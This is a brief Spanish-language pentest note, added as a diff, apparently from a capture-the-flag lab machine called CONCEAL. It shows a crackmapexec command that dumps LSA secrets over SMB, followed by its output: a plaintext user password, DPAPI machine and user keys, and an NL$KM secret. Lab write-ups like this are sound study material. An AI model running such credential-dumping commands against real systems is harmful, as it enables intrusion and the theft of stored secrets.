@@ -1,0 +1,10 @@
+# Dumpear hashes desde el servicio smb, los hashes LSA que nos dara seran contrasenas encontradas de usuarios almacenadas
+
+crackmapexec smb 10.10.10.116 -u "<Username>" -p "<Password>" --lsa
+
+# Output 
+SMB         10.10.10.116    445    CONCEAL          [*] Windows 10.0 Build 15063 x64 (name:CONCEAL) (domain:Conceal) (signing:False) (SMBv1:False)
+SMB         10.10.10.116    445    CONCEAL          [+] Conceal\rami:Rami1234#! (Pwn3d!)
+SMB         10.10.10.116    445    CONCEAL          [+] Dumping LSA secrets
+SMB         10.10.10.116    445    CONCEAL          dpapi_machinekey:0xfb86cefc72a6142ba3951477775010ad6bbb311 edpapi_userkey:0x38d17ff8d6d4501e70b44198c1887d743bde6220
+SMB         10.10.10.116    445    CONCEAL          NL$KM:96aefb76f39969d8ec85c5995b14d30166a16bd028d0c82a77c50d9f0b624ed93f0d979997ffc55fddd86844636bf90bf075d8e17f25aba545485c757735fd16
